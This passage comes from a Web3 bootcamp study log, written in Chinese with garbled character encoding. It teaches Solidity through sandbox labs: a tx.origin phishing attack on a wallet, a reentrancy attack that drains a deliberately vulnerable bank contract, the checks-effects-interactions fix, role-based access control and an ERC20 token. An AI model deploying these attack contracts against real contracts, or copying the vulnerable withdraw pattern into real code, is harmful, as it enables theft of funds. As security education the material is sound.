    function claimAirdrop() public {
        // å½“ owner è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼š
        // 1. tx.origin æ˜¯ owner
        // 2. msg.sender æ˜¯ owner
        
        // æ”»å‡»å¼€å§‹ï¼šæ”»å‡»åˆçº¦ä»£æ›¿ owner å»è°ƒç”¨å—å®³è€…é’±åŒ…
        // åœ¨ victim.withdrawAll å†…éƒ¨ï¼š
        //    tx.origin ä¾ç„¶æ˜¯ owner (æ£€æŸ¥é€šè¿‡ï¼)
        //    msg.sender æ˜¯ Attack åˆçº¦ (è¢«å¿½ç•¥)
        victim.withdrawAll(hacker);
    }
}
```

* * *

## 3\. æ”»å‡»æ­¥éª¤ (é’“é±¼æ¨¡æ‹Ÿ)

**æ­¥éª¤ 1ï¼šéƒ¨ç½²å—å®³è€…**

1.  ä½¿ç”¨ **è´¦å· A** (æ‰®æ¼”ç®¡ç†å‘˜)ã€‚
    
2.  éƒ¨ç½² `Phishable`ï¼Œå¹¶å­˜å…¥ **5 ETH** (åœ¨ Deploy æ—¶ Value å¡« 5)ã€‚
    

**æ­¥éª¤ 2ï¼šéƒ¨ç½²æ”»å‡»è€…**

1.  åˆ‡æ¢åˆ° **è´¦å· B** (æ‰®æ¼”é»‘å®¢)ã€‚
    
2.  å¡«å…¥ `Phishable` çš„åœ°å€ï¼Œéƒ¨ç½² `Attack`ã€‚
    

**æ­¥éª¤ 3ï¼šå—å®³è€…ä¸Šé’© (å…³é”®ä¸€æ­¥)**

_è¿™æ˜¯ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»ã€‚å‡è®¾é»‘å®¢å‘ç»™ç®¡ç†å‘˜ä¸€ä¸ªé“¾æ¥ï¼šâ€œç‚¹å‡»é¢†å– 1000 USDT ç©ºæŠ•ï¼â€_

1.  **åˆ‡å› è´¦å· A** (ç®¡ç†å‘˜)ã€‚
    
2.  è°ƒç”¨ `Attack` åˆçº¦çš„ `claimAirdrop` å‡½æ•°ã€‚
    
    -   _ç®¡ç†å‘˜å¿ƒæƒ³ï¼šæˆ‘åªæ˜¯è°ƒä¸€ä¸‹è¿™ä¸ªç©ºæŠ•åˆçº¦ï¼Œåˆæ²¡æŠŠç§é’¥ç»™ä»–ï¼Œèƒ½å‡ºä»€ä¹ˆäº‹ï¼Ÿ_
        
3.  **ç»“æœï¼š** äº¤æ˜“æˆåŠŸã€‚
    

**æ­¥éª¤ 4ï¼šæŸ¥çœ‹æˆ˜æœ**

1.  æŸ¥çœ‹ `Phishable` ä½™é¢ -> **0**ã€‚
    
2.  æŸ¥çœ‹ é»‘å®¢ (è´¦å· B) ä½™é¢ -> **å¢åŠ äº† 5 ETH**ã€‚
    

* * *

4\. è¿›é˜¶é˜²å¾¡ï¼šåŸºäºè§’è‰²çš„æƒé™æ§åˆ¶ (RBAC)

æ—¢ç„¶ `onlyOwner` åªèƒ½ç®¡ä¸€ä¸ªäººï¼Œå¦‚æœæˆ‘æœ‰â€œå‘è´§å‘˜â€ã€â€œè´¢åŠ¡â€ã€â€œç®¡ç†å‘˜â€ä¸‰ç§è§’è‰²æ€ä¹ˆåŠï¼Ÿ

åµŒå…¥å¼é‡Œæˆ‘ä»¬ç”¨ **ä½æ©ç  (Bitmask)**ï¼ŒWeb3 é‡Œæˆ‘ä»¬ç”¨ **OpenZeppelin AccessControl**ã€‚

è¯·æ–°å»º `Day13_AccessControl.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

contract SupplyChain is AccessControl {
    // 1. å®šä¹‰è§’è‰² (æœ¬è´¨ä¸Šæ˜¯ bytes32 å“ˆå¸Œå€¼)
    // ADMIN_ROLE æ˜¯é»˜è®¤ç®¡ç†å‘˜è§’è‰²
    bytes32 public constant LOGISTICS_ROLE = keccak256("LOGISTICS");
    bytes32 public constant FINANCE_ROLE = keccak256("FINANCE");

    constructor() {
        // 2. ç»™éƒ¨ç½²è€…èµ‹äºˆæœ€é«˜ç®¡ç†å‘˜æƒé™
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    // 3. åªæœ‰â€œç‰©æµå‘˜â€èƒ½è°ƒç”¨çš„å‡½æ•°
    function shipProduct() public onlyRole(LOGISTICS_ROLE) {
        // å‘è´§é€»è¾‘...
    }

    // 4. åªæœ‰â€œè´¢åŠ¡â€èƒ½è°ƒç”¨çš„å‡½æ•°
    function approvePayment() public onlyRole(FINANCE_ROLE) {
        // ä»˜æ¬¾é€»è¾‘...
    }

    // 5. ç®¡ç†å‘˜å¯ä»¥æ·»åŠ æ–°äºº
    function hireLogistics(address _newWorker) public onlyRole(DEFAULT_ADMIN_ROLE) {
        grantRole(LOGISTICS_ROLE, _newWorker);
    }
}
```

* * *

### ä»Šæ—¥ä»»åŠ¡

1.  **å®Œæˆé’“é±¼æ”»å‡»ï¼š** æˆªå›¾è¯æ˜æ˜æ˜åªæ˜¯ç‚¹äº†ä¸€ä¸ªä¸ç›¸å…³çš„åˆçº¦ï¼Œç»“æœè‡ªå·±çš„é’±åŒ…å´è¢«æç©ºäº†ã€‚
    
2.  **ä½“éªŒ RBACï¼š**
    
    -   éƒ¨ç½² `SupplyChain`ã€‚
        
    -   å°è¯•ç”¨ç®¡ç†å‘˜è´¦å·è°ƒç”¨ `shipProduct` -> **é¢„æœŸæŠ¥é”™** (å› ä¸ºç®¡ç†å‘˜é»˜è®¤åªæœ‰ Admin æƒé™ï¼Œæ²¡æœ‰ç‰©æµæƒé™)ã€‚
        
    -   ç»™è‡ªå·± `grantRole(LOGISTICS_ROLE, ä½ çš„åœ°å€)`ã€‚
        
    -   å†æ¬¡è°ƒç”¨ `shipProduct` -> **é¢„æœŸæˆåŠŸ**ã€‚
<!-- DAILY_CHECKIN_2026-01-24_END -->

# 2026-01-23
<!-- DAILY_CHECKIN_2026-01-23_START -->







# ç¬¬12å¤©ï¼šé‡å…¥æ”»å‡» (Reentrancy) â€”â€” è‡´å‘½çš„é€’å½’ä¸­æ–­

1\. ç†è®ºæ˜ å°„ï¼šä¸­æ–­åµŒå¥—ä¸ä¸´ç•ŒåŒºå¤±æ•ˆ

åœ¨ RTOS æˆ–è£¸æœºå¼€å‘ä¸­ï¼Œä½ ä¸€å®šé‡åˆ°è¿‡è¿™ç§å™©æ¢¦åœºæ™¯ï¼š

1.  **ä¸»çº¿ä»»åŠ¡**æ­£åœ¨ä¿®æ”¹ä¸€ä¸ªå…¨å±€å˜é‡ `Global_Counter`ï¼ˆæ¯”å¦‚å‡ 1ï¼‰ã€‚
    
2.  **çªç„¶ä¸­æ–­æ¥äº†**ï¼ˆISRï¼‰ã€‚
    
3.  **ISR** é‡Œç«Ÿç„¶ä¹Ÿå»æ“ä½œè¿™ä¸ª `Global_Counter`ã€‚
    
4.  **ç»“æœï¼š** ä¸»çº¿ä»»åŠ¡æ¢å¤æ—¶ï¼Œè¦†ç›–äº† ISR çš„ä¿®æ”¹ï¼Œæˆ–è€… ISR åŸºäºé”™è¯¯çš„å€¼åšäº†åˆ¤æ–­ã€‚
    

**åœ¨åŒºå—é“¾ä¸­ï¼Œæƒ…å†µæ›´ç³Ÿï¼š**

-   **åœºæ™¯ï¼š** é“¶è¡Œåˆçº¦æ­£åœ¨ç»™ç”¨æˆ·é€€æ¬¾ï¼ˆè½¬è´¦ ETHï¼‰ã€‚
    
-   **è§¦å‘ï¼š** è½¬è´¦åŠ¨ä½œï¼ˆ`call`ï¼‰ä¼šè‡ªåŠ¨è§¦å‘æ”¶æ¬¾æ–¹åˆçº¦çš„ `receive()` å‡½æ•°ï¼ˆç›¸å½“äºè§¦å‘äº†å¤–éƒ¨ä¸­æ–­ï¼‰ã€‚
    
-   **æ”»å‡»ï¼š** é»‘å®¢åœ¨ `receive()` å‡½æ•°é‡Œï¼Œ**å†æ¬¡è°ƒç”¨** é“¶è¡Œçš„é€€æ¬¾å‡½æ•°ã€‚
    
-   **æ¼æ´ï¼š** æ­¤æ—¶é“¶è¡Œçš„â€œä½™é¢æ‰£é™¤â€ä»£ç è¿˜æ²¡æ‰§è¡Œå®Œï¼é“¶è¡Œä»¥ä¸ºé»‘å®¢è¿˜æœ‰é’±ï¼Œäºæ˜¯å†æ¬¡è½¬è´¦... å¦‚æ­¤å¾ªç¯ï¼Œç›´åˆ°é“¶è¡Œè¢«æç©ºã€‚
    

è¿™å°±æ˜¯ **â€œé‡å…¥â€**ï¼šåœ¨å‡½æ•°æ‰§è¡Œç»“æŸå‰ï¼Œé‡æ–°è¿›å…¥äº†è¯¥å‡½æ•°ã€‚

* * *

2\. å®æˆ˜æ¼”ç»ƒï¼šæç©º ATM æœº

æˆ‘ä»¬è¦å†™ä¸¤ä¸ªåˆçº¦ï¼šä¸€ä¸ªâ€œå‚»ç™½ç”œâ€é“¶è¡Œï¼ˆå—å®³è€…ï¼‰ï¼Œä¸€ä¸ªâ€œå¼ºç›—â€åˆçº¦ï¼ˆæ”»å‡»è€…ï¼‰ã€‚

**è¯·åœ¨ Remix ä¸­æ–°å»º** `Day12_Reentrancy.sol`**ï¼š**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. å—å®³è€…åˆçº¦ (Vulnerable Bank) ---
contract EtherStore {
    mapping(address => uint256) public balances;

    // å­˜æ¬¾åŠŸèƒ½
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // å–æ¬¾åŠŸèƒ½ (æœ‰æ¼æ´ï¼)
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        // [æ¼æ´ç‚¹]ï¼šå…ˆç»™é’± (Interaction)
        // è¿™ä¸€æ­¥ä¼šè§¦å‘æ¥æ”¶æ–¹çš„ fallback/receive å‡½æ•°
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // [æ¼æ´ç‚¹]ï¼šåæ‰£æ¬¾ (Effect)
        // æ”»å‡»è€…ä¼šåœ¨ä¸Šä¸€è¡Œä»£ç æ‰§è¡Œæ—¶ï¼Œåˆ©ç”¨â€œé€’å½’â€å†æ¬¡å†²è¿›è¿™ä¸ªå‡½æ•°
        // æ­¤æ—¶è¿™è¡Œä»£ç è¿˜æ²¡æ‰§è¡Œï¼Œbalances è¿˜æ²¡å˜ï¼
        balances[msg.sender] = 0;
    }

    // æŸ¥çœ‹é“¶è¡Œæ€»ä½™é¢
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// --- 2. æ”»å‡»è€…åˆçº¦ (Hacker) ---
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // æ”»å‡»å…¥å£
    function attack() external payable {
        require(msg.value >= 1 ether);
        // 1. å…ˆå­˜é’±ï¼ŒæŠŠè‡ªå·±ä¼ªè£…æˆæ­£å¸¸å‚¨æˆ·
        etherStore.deposit{value: 1 ether}();
        // 2. å‘èµ·ææ¬¾ï¼Œè§¦å‘è¿ç¯é™·é˜±
        etherStore.withdraw();
    }

    // [å…³é”®]ï¼šç±»ä¼¼ä¸­æ–­æœåŠ¡å‡½æ•° (ISR)
    // å½“æ”¶åˆ° ETH æ—¶è‡ªåŠ¨è§¦å‘
    fallback() external payable {
        // æ£€æŸ¥é“¶è¡Œè¿˜æœ‰æ²¡æœ‰é’±
        if (address(etherStore).balance >= 1 ether) {
            // [é€’å½’è°ƒç”¨]ï¼šè¶ä½™é¢è¿˜æ²¡æ‰£ï¼Œå†å–ä¸€æ¬¡ï¼
            etherStore.withdraw();
        }
    }

    // æŸ¥çœ‹èµƒæ¬¾
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

* * *

3\. æ”»å‡»æ­¥éª¤ (è¯·ä¸¥æ ¼æŒ‰é¡ºåºæ“ä½œ)

**ç¯å¢ƒå‡†å¤‡ï¼š** ä½¿ç”¨ `Remix VM (Cancun)`ã€‚

**æ­¥éª¤ 1ï¼šéƒ¨ç½²å—å®³è€… (EtherStore)**

1.  éƒ¨ç½² `EtherStore`ã€‚
    
2.  **ç»™é“¶è¡Œå……å€¼ï¼ˆæ‰®æ¼”æ— è¾œç¾¤ä¼—ï¼‰ï¼š**
    
    -   åœ¨å·¦ä¾§ **Value** æ è¾“å…¥ `5`ï¼Œå•ä½é€‰ `Ether`ã€‚
        
    -   ç‚¹å‡» `deposit`ã€‚
        
    -   _æ­¤æ—¶é“¶è¡Œé‡Œæœ‰ 5 ETHï¼ˆåŒ…å«äº†ä½ å­˜çš„ï¼‰ã€‚_
        

**æ­¥éª¤ 2ï¼šéƒ¨ç½²æ”»å‡»è€… (Attack)**

1.  å¤åˆ¶ `EtherStore` çš„åœ°å€ã€‚
    
2.  åœ¨ `Attack` çš„éƒ¨ç½²æ å¡«å…¥è¯¥åœ°å€ï¼Œç‚¹å‡» Deployã€‚
    

**æ­¥éª¤ 3ï¼šå‘èµ·æ”»å‡» (Attack)**

1.  å±•å¼€ `Attack` åˆçº¦ã€‚
    
2.  åœ¨å·¦ä¾§ **Value** æ è¾“å…¥ `1`ï¼Œå•ä½é€‰ `Ether`ï¼ˆè¿™æ˜¯æ”»å‡»è€…çš„æœ¬é‡‘ï¼‰ã€‚
    
3.  ç‚¹å‡» `attack` æŒ‰é’®ï¼ˆçº¢è‰²æŒ‰é’®ï¼‰ã€‚
    

**æ­¥éª¤ 4ï¼šæŸ¥çœ‹æˆ˜æœ**

1.  æŸ¥çœ‹ `EtherStore` çš„ `getBalance` -> **åº”è¯¥æ˜¯** `0` (è¢«æç©ºäº†)ã€‚
    
2.  æŸ¥çœ‹ `Attack` çš„ `getBalance` -> **åº”è¯¥æ˜¯** `6` **ETH** (æœ¬é‡‘ 1 + æŠ¢æ¥çš„ 5)ã€‚
    

* * *

4\. ä¿®å¤æ–¹æ¡ˆï¼šChecks-Effects-Interactions

è¿˜è®°å¾—æˆ‘ä»¬åœ¨ **ç¬¬ 4 å¤©** è®²çš„é‚£ä¸ªé“å¾‹å—ï¼Ÿç°åœ¨ä½ çŸ¥é“ä¸ºä»€ä¹ˆå®ƒè¿™ä¹ˆé‡è¦äº†ã€‚

**åµŒå…¥å¼ä¿®å¤é€»è¾‘ï¼š** å°±åƒåœ¨ ISR ä¸­å¤„ç†å…±äº«å˜é‡ä¸€æ ·ï¼š**å…ˆæ›´æ–°çŠ¶æ€æ ‡å¿—ä½ï¼Œå†æ‰§è¡Œè€—æ—¶æ“ä½œã€‚**

**è¯·ä¿®æ”¹** `withdraw` **å‡½æ•°ä¸ºå®‰å…¨ç‰ˆæœ¬ï¼š**

Solidity

```
function withdrawSafe() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);

    // [ä¿®å¤]ï¼šå…ˆæ‰£æ¬¾ (Effect)
    // å°±ç®—é»‘å®¢å†æ¬¡é‡å…¥ï¼Œè¿›æ¥ä¸€æŸ¥ balances å·²ç»æ˜¯ 0 äº†
    balances[msg.sender] = 0;

    // [ä¿®å¤]ï¼šåç»™é’± (Interaction)
    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```

* * *

![å±å¹•æˆªå›¾ 2026-01-23 160531.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-23-1769156734535-_____2026-01-23_160531.png)![å±å¹•æˆªå›¾ 2026-01-23 160256.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-23-1769156719588-_____2026-01-23_160256.png)

### ä»Šæ—¥ä»»åŠ¡

1.  **æˆåŠŸå¤ç°æ”»å‡»**ï¼šè¿™ä¸€æ­¥éå¸¸çˆ½ï¼Œäº²çœ¼çœ‹åˆ°é“¶è¡Œä½™é¢å½’é›¶ã€‚è¯·æˆªå›¾ `EtherStore` ä½™é¢ä¸º 0 çš„ç”»é¢ ã€‚
    
2.  **ä¿®å¤å¹¶æµ‹è¯•**ï¼šæŠŠ `EtherStore` ä»£ç æ¢æˆ `withdrawSafe`ï¼Œé‡æ–°éƒ¨ç½²ï¼Œå†æ¬¡å°è¯•æ”»å‡»ã€‚è¿™æ¬¡æ”»å‡»åº”è¯¥ä¼šå¤±è´¥ï¼ˆæˆ–è€…åªèƒ½å–å‡ºæœ¬é‡‘ï¼Œæ— æ³•ç›—å–é¢å¤–èµ„é‡‘ï¼‰ã€‚
    

**åšå®Œè¿™ä¸ªï¼Œä½ å°±çœŸæ­£ç†è§£äº†ä¸ºä»€ä¹ˆæ™ºèƒ½åˆçº¦å¼€å‘è¢«ç§°ä¸ºâ€œåœ¨åˆ€å°–ä¸Šè·³èˆâ€ï¼**
<!-- DAILY_CHECKIN_2026-01-23_END -->

# 2026-01-22
<!-- DAILY_CHECKIN_2026-01-22_START -->








# ç¬¬11å¤©ï¼šä»£å¸æ ‡å‡† (ERC20) â€”â€” å‘è¡Œâ€œæ•°å­—è´§å¸â€

ä»Šå¤©æˆ‘ä»¬è¦æŠŠæŠ€èƒ½å˜ç°ã€‚æˆ‘ä»¬è¦å­¦ä¹  **ERC20 æ ‡å‡†**ã€‚

åœ¨åŒºå—é“¾ä¸–ç•Œï¼Œå‘å¸ï¼ˆTokenï¼‰å¬èµ·æ¥å¾ˆç¥ç§˜ï¼Œä½†å¯¹äºåµŒå…¥å¼å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œå®ƒå…¶å®å°±æ˜¯**å®ç°äº†ä¸€ä¸ªç‰¹å®šçš„æ¥å£æ ‡å‡†**ã€‚

## 1\. ç†è®ºæ˜ å°„ï¼šæ ‡å‡†åè®®æ ˆ (USB HID vs ERC20)

| æ¦‚å¿µ | åµŒå…¥å¼ USB è®¾å¤‡ | åŒºå—é“¾ ERC20 ä»£å¸ |
| æœ¬è´¨ | éµå¾ª USB HID æ ‡å‡†çš„å›ºä»¶ | éµå¾ª ERC20 æ¥å£çš„æ™ºèƒ½åˆçº¦ |
| å…¼å®¹æ€§ | åªè¦ç¬¦åˆ HID æ ‡å‡†ï¼Œæ’åˆ°ä»»ä½•ç”µè„‘ï¼ˆWindows/Mac/Linuxï¼‰éƒ½èƒ½è¯†åˆ«ä¸ºé¼ æ ‡/é”®ç›˜ï¼Œæ— éœ€é©±åŠ¨ã€‚ | åªè¦ç¬¦åˆ ERC20 æ ‡å‡†ï¼Œä»»ä½•é’±åŒ…ï¼ˆMetaMaskï¼‰æˆ–äº¤æ˜“æ‰€éƒ½èƒ½è¯†åˆ«å¹¶æ˜¾ç¤ºæ‚¨çš„ä½™é¢ï¼Œæ— éœ€é€‚é…ã€‚ |
| å¼€å‘æ–¹å¼ | ä¸æ¨èä»é›¶å†™ USB åè®®æ ˆï¼ˆå®¹æ˜“å‡ºé”™ï¼‰ã€‚æ¨èä½¿ç”¨å‚å•†åº“ï¼ˆSTM32 HAL / TinyUSBï¼‰ã€‚ | ä¸æ¨èä»é›¶å†™ä»£å¸é€»è¾‘ï¼ˆå®¹æ˜“æœ‰æ¼æ´ï¼‰ã€‚æ¨èä½¿ç”¨æ ‡å‡†åº“ï¼ˆOpenZeppelinï¼‰ã€‚ |

**æ ¸å¿ƒé€»è¾‘ï¼š**

ERC20 ä»£å¸æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª Excel è¡¨æ ¼ï¼ˆMappingï¼‰ï¼š

`mapping(address => uint256) balances;`

æ‰€æœ‰çš„è½¬è´¦ï¼ˆTransferï¼‰ï¼Œå°±æ˜¯åœ¨è¿™ä¸ªè¡¨é‡ŒæŠŠ A çš„æ•°å­—å‡å°ï¼ŒæŠŠ B çš„æ•°å­—å¢å¤§ã€‚

* * *

## 2\. å·¥å…·å‡†å¤‡ï¼šå¼•å…¥ OpenZeppelin (HAL åº“)

æˆ‘ä»¬ä¸éœ€è¦è‡ªå·±å†™ `transfer` å‡½æ•°çš„åŠ å‡æ³•ï¼ˆå› ä¸ºè¦å¤„ç†æº¢å‡ºã€å®‰å…¨æ£€æŸ¥ç­‰ç¹çç»†èŠ‚ï¼‰ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ **OpenZeppelin**ã€‚è¿™å°±åƒæˆ‘ä»¬åœ¨ STM32 å¼€å‘ä¸­ç›´æ¥å¼•ç”¨ `#include "stm32f1xx_hal.h"`ã€‚

3\. ä»£ç å®æˆ˜ï¼šå‘è¡Œ "IoT Reward Token"

æˆ‘ä»¬å°†å‘è¡Œä¸€ä¸ªåä¸º **"IoT Reward" (IOTR)** çš„ä»£å¸ï¼Œç”¨äºå¥–åŠ±é‚£äº›ä¸Šä¼ ä¼ æ„Ÿå™¨æ•°æ®çš„è®¾å¤‡ã€‚

è¯·åœ¨ Remix ä¸­æ–°å»º `Day11_Token.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. å¼•å…¥æ ‡å‡†åº“ (ç›¸å½“äº #include "HAL_Driver.h")
// Remix ä¼šè‡ªåŠ¨ä» GitHub ä¸‹è½½è¿™ä¸ªæ–‡ä»¶
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// 2. ç»§æ‰¿ ERC20 åŠŸèƒ½
contract IoTReward is ERC20 {
    
    // æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–ä»£å¸åå­—å’Œä»£å·
    constructor() ERC20("IoT Reward Token", "IOTR") {
        // 3. "é“¸é€ " (Mint) ä»£å¸
        // å°±åƒå‡ºå‚è®¾ç½®æ—¶åˆå§‹åŒ–è®¡æ•°å™¨
        // 1000 * 10**18 ä»£è¡¨ 1000 ä¸ªå¸ (å› ä¸ºä»¥å¤ªåŠé»˜è®¤ 18 ä½å°æ•°)
        // msg.sender æ˜¯æ‚¨è‡ªå·±ï¼Œæ„æ€æ˜¯æŠŠè¿™ 1000 ä¸ªå¸åˆå§‹åˆ†é…ç»™ç®¡ç†å‘˜
        _mint(msg.sender, 1000 * 10**18);
    }

    // æ¨¡æ‹Ÿä¸€ä¸ªåªæœ‰ç®¡ç†å‘˜èƒ½è°ƒç”¨çš„å‘å¥–å‡½æ•°
    function rewardDevice(address _device, uint256 _amount) public {
        // åœ¨çœŸå®é¡¹ç›®ä¸­è¿™é‡Œåº”è¯¥åŠ  onlyOwner æƒé™æ§åˆ¶
        // é“¸é€ æ–°çš„å¸ç»™è®¾å¤‡
        _mint(_device, _amount);
    }
}
```

* * *

## 4\. å®éªŒæ­¥éª¤

**æ­¥éª¤ 1ï¼šéƒ¨ç½²åˆçº¦**

1.  ç¼–è¯‘ä»£ç ï¼ˆç¬¬ä¸€æ¬¡å¯èƒ½æ¯”è¾ƒæ…¢ï¼Œå› ä¸ºè¦ä¸‹è½½åº“æ–‡ä»¶ï¼‰ã€‚
    
2.  éƒ¨ç½² `IoTReward`ã€‚
    

**æ­¥éª¤ 2ï¼šæŸ¥çœ‹ä½™é¢**

1.  å±•å¼€åˆçº¦ï¼Œæ‰¾åˆ° `balanceOf` å‡½æ•°ã€‚
    
2.  è¾“å…¥æ‚¨çš„åœ°å€ï¼ˆAccount æ é‡Œçš„é‚£ä¸ªåœ°å€ï¼‰ã€‚
    
3.  ç‚¹å‡» callã€‚
    
    -   **é¢„æœŸç»“æœï¼š** ä¸€ä¸ªå·¨å¤§çš„æ•°å­— `1000000000000000000000`ã€‚
        
    -   _è§£é‡Šï¼š_ è¿™å°±æ˜¯ `1000` ä¸ªå¸ã€‚å› ä¸º Solidity ä¸æ”¯æŒå°æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ `10^18` ä½œä¸ºæœ€å°å•ä½ï¼ˆWeiï¼‰ã€‚è¿™å°±åƒæˆ‘ä»¬åœ¨ MCU é‡Œç”¨ `mV` (æ¯«ä¼) å­˜ç”µå‹ï¼Œè€Œä¸æ˜¯ `V`ã€‚
        

**æ­¥éª¤ 3ï¼šè½¬è´¦æµ‹è¯• (Transfer)**

1.  æ‰¾åˆ° `transfer` å‡½æ•°ã€‚
    
2.  **To:** å¤åˆ¶ Account ä¸‹æ‹‰èœå•é‡Œçš„**ç¬¬äºŒä¸ªåœ°å€**ã€‚
    
3.  **Amount:** è¾“å…¥ `1000000000000000000` (å³ 1 ä¸ªå¸ï¼Œ1 åé¢ 18 ä¸ª 0)ã€‚
    
4.  ç‚¹å‡» transactã€‚
    

**æ­¥éª¤ 4ï¼šéªŒè¯è½¬è´¦**

1.  å†æ¬¡ç”¨ `balanceOf` æŸ¥ç¬¬äºŒä¸ªåœ°å€çš„ä½™é¢ã€‚
    
    -   åº”è¯¥æ˜¾ç¤º `1000000000000000000`ã€‚
        
2.  æŸ¥ç¬¬ä¸€ä¸ªåœ°å€ï¼ˆæ‚¨è‡ªå·±ï¼‰çš„ä½™é¢ã€‚
    
    -   åº”è¯¥å˜æˆäº† `999000...`ã€‚
        
        ![å±å¹•æˆªå›¾ 2026-01-22 175839.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769088003769-_____2026-01-22_175839.png)

![å±å¹•æˆªå›¾ 2026-01-22 175932.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769088029264-_____2026-01-22_175932.png)![å±å¹•æˆªå›¾ 2026-01-21 120047.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-22-1769087972007-_____2026-01-21_120047.png)

### æ·±åº¦æ€è€ƒ (åµŒå…¥å¼è§†è§’)

åšå®Œå®éªŒåï¼Œè¯·æ€è€ƒè¿™ä¸ªåœºæ™¯ï¼š

åœ¨å¾ˆå¤šåµŒå…¥å¼ç³»ç»Ÿä¸­ï¼ŒCPU å¯¹å¤–è®¾çš„è®¿é—®éœ€è¦â€œæˆæƒâ€ã€‚

åœ¨ ERC20 ä¸­ï¼Œæœ‰ä¸€ä¸ª `approve` **(æˆæƒ)** å’Œ `transferFrom` **(ä»£è½¬)** æœºåˆ¶ã€‚

å®ƒçš„ä½œç”¨æ˜¯ï¼š**æˆ‘ï¼ˆç”¨æˆ·ï¼‰æˆæƒç»™ ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼ˆæ¯”å¦‚è‡ªåŠ¨å”®è´§æœºï¼‰ï¼Œå…è®¸å®ƒä»æˆ‘çš„é’±åŒ…é‡Œæ‰£æ¬¾ 50 å—é’±ã€‚**

è¿™å°±åƒæ‚¨åœ¨ STM32 ä¸­å¼€å¯ DMA é€šä¿¡ï¼š

1.  **CPU (ç”¨æˆ·):** é…ç½® DMA æ§åˆ¶å™¨ï¼Œå…è®¸å®ƒè®¿é—® RAM çš„æŸå—åŒºåŸŸï¼ˆApproveï¼‰ã€‚
    
2.  **DMA (åˆçº¦):** åœ¨æ•°æ®åˆ°æ¥æ—¶ï¼Œè‡ªåŠ¨æ¬è¿æ•°æ®ï¼Œä¸éœ€è¦ CPU å†æ¬¡å¹²é¢„ï¼ˆTransferFromï¼‰ã€‚
<!-- DAILY_CHECKIN_2026-01-22_END -->

# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->









# ç¬¬10å¤©ï¼šæ¥å£ (Interface) ä¸ ç»§æ‰¿ (Inheritance)

## 1\. ç†è®ºæ˜ å°„ï¼šå¤´æ–‡ä»¶ä¸é©±åŠ¨å±‚

| C è¯­è¨€ | Solidity | ä½œç”¨ |
| .h å¤´æ–‡ä»¶ | interface | åªå®šä¹‰å‡½æ•°åŸå‹ï¼ˆåå­—ã€å‚æ•°ã€è¿”å›å€¼ï¼‰ï¼Œä¸å†™å®ç°ã€‚å‘Šè¯‰ç¼–è¯‘å™¨â€œå¯¹æ–¹æœ‰å“ªäº›åŠŸèƒ½ç â€ã€‚ |
| #include | import | å¼•å…¥å¤–éƒ¨ä»£ç ã€‚ |
| struct ç»§æ‰¿/ç»„åˆ | contract A is B | å­åˆçº¦è‡ªåŠ¨æ‹¥æœ‰çˆ¶åˆçº¦çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°ã€‚ |
| virtual / override | virtual / override | å…è®¸å­ç±»é‡å†™çˆ¶ç±»çš„é€»è¾‘ï¼ˆå¤šæ€ï¼‰ã€‚ |

* * *

## 2\. ä»£ç å®æˆ˜ï¼šæ„å»ºâ€œå†œä¸šä¼ æ„Ÿå™¨ç½‘ç»œâ€

æˆ‘ä»¬è¦æ¨¡æ‹Ÿä¸€ä¸ªåœºæ™¯ï¼š

1.  **å®šä¹‰æ ‡å‡†ï¼š** æ‰€æœ‰ä¼ æ„Ÿå™¨ï¼ˆæ— è®ºæ˜¯æ¸©åº¦è¿˜æ˜¯æ¹¿åº¦ï¼‰éƒ½å¿…é¡»éµå®ˆä¸€ä¸ªæ¥å£æ ‡å‡† `ISensor`ã€‚
    
2.  **å…·ä½“å®ç°ï¼š** ç¼–å†™ `TemperatureSensor` å®ç°è¯¥æ¥å£ã€‚
    
3.  **ä¸­å¤®æ§åˆ¶ï¼š** ç¼–å†™ `CentralHub`ï¼Œå®ƒå¯ä»¥ç»Ÿä¸€ç®¡ç†ä»»ä½•éµå®ˆ `ISensor` æ ‡å‡†çš„è®¾å¤‡ã€‚
    

è¯·åœ¨ Remix ä¸­æ–°å»º `Day10_Interface.sol`ï¼š

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. å®šä¹‰æ¥å£ (ç›¸å½“äº .h å¤´æ–‡ä»¶) ---
// è§„å®šæ‰€æœ‰ä¼ æ„Ÿå™¨å¿…é¡»å…·å¤‡è¯»å– value çš„èƒ½åŠ›
interface ISensor {
